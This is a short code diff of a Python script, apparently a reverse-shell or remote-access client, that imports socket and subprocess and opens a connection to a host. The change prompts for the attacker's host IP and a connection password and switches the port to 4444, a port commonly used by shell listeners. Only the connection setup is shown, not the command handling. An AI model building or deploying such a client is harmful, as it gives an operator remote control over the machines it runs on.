@@ -2,11 +2,13 @@ import socket
 import subprocess
 import os
 
-PASSWORD = "StrongPassword"  # Change this to a strong password
+yourip = input("Input Host IP: ")
+password = input("Input A strong password to encrypt the connection(only letters) : ")
+PASSWORD = str(password)  # Change this to a strong password
 
 s = socket.socket()
-host = "127.0.0.1"  # Change this to your server's IP
-port = 9998
+host = str(yourip)  # Change this to your server's IP
+port = 4444
 
 try:
     s.connect((host, port))
